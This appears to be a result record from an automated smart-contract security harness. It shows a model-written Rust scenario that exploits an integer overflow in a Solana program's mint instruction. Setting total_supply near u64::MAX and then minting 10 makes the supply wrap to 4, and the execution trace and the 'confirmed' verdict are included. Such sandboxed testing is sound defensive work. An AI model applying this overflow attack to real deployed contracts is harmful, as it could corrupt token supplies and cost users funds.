@@ -1,0 +1,131 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: total_supply deu a volta (overflow): valor resultante menor que o inicial; total_supply resultante e exatamente 4 (wrap-around de u64::MAX - 5 + 10)",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2274,
+        "completion_tokens": 624,
+        "latency_s": 3.51
+      },
+      "raw": "{\"plan\": \"Inicializo o ledger com total_supply = u64::MAX - 5 e user_balance = 0 via instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que sob a hipotese de overflow faz total_supply dar a volta para 4 em vez de falhar. O efeito medido e que total_supply resultante e menor que o valor inicial (4 < u64::MAX - 5), demonstrando o wrap-around.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(u64::MAX - 5),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\n\\nlet init_accounts = vec![\\n    (ledger_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\n\\nlet r_init = env.baseline(\\\"initialize ledger com total_supply = u64::MAX - 5\\\", &init_ix, &init_accounts);\\n\\nlet ledger_after_init = after(&r_init, &ledger_key).clone();\\n\\nlet mint_ix = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(10u64),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\nlet mint_accounts = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"mint com amount = 10 sobre total_supply = u64::MAX - 5\\\", &mint_ix, &mint_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data = after(&r, &ledger_key).data();\\n    let total_supply = read_u64(data, 40);\\n    env.effect(\\\"total_supply deu a volta (overflow): valor resultante menor que o inicial\\\", total_supply < u64::MAX - 5);\\n    env.effect(\\\"total_supply resultante e exatamente 4 (wrap-around de u64::MAX - 5 + 10)\\\", total_supply == 4);\\n}\"}",
+      "plan": "Inicializo o ledger com total_supply = u64::MAX - 5 e user_balance = 0 via instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que sob a hipotese de overflow faz total_supply dar a volta para 4 em vez de falhar. O efeito medido e que total_supply resultante e menor que o valor inicial (4 < u64::MAX - 5), demonstrando o wrap-around.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(u64::MAX - 5),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\n\nlet init_accounts = vec![\n    (ledger_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\n\nlet r_init = env.baseline(\"initialize ledger com total_supply = u64::MAX - 5\", &init_ix, &init_accounts);\n\nlet ledger_after_init = after(&r_init, &ledger_key).clone();\n\nlet mint_ix = env.anchor_ix(\n    \"mint\",\n    &(10u64),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\nlet mint_accounts = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"mint com amount = 10 sobre total_supply = u64::MAX - 5\", &mint_ix, &mint_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data = after(&r, &ledger_key).data();\n    let total_supply = read_u64(data, 40);\n    env.effect(\"total_supply deu a volta (overflow): valor resultante menor que o inicial\", total_supply < u64::MAX - 5);\n    env.effect(\"total_supply resultante e exatamente 4 (wrap-around de u64::MAX - 5 + 10)\", total_supply == 4);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger com total_supply = u64::MAX - 5",
+            "result": "Success",
+            "compute_units": 5933,
+            "account_flags": "sw,sw,-r",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": "2b2915d5b4b05f200000000000000001000000000000000000000000000000000000000000000000faffffffffffffff0000000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint com amount = 10 sobre total_supply = u64::MAX - 5",
+            "result": "Success",
+            "compute_units": 2193,
+            "account_flags": "-w,sr",
+            "ix_head": "e4fde9e1f10fd3a0",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA",
+                "data_len": 56,
+                "head": "2b2915d5b4b05f20",
+                "digest": "b6d2a315a60e9aa2",
+                "post": "2b2915d5b4b05f20000000000000000100000000000000000000000000000000000000000000000004000000000000000a00000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "total_supply deu a volta (overflow): valor resultante menor que o inicial",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "total_supply resultante e exatamente 4 (wrap-around de u64::MAX - 5 + 10)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5933 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2193 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: total_supply deu a volta (overflow): valor resultante menor que o inicial; total_supply resultante e exatamente 4 (wrap-around de u64::MAX - 5 + 10)"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Integer Overflow / Underflow."
+  }
+}
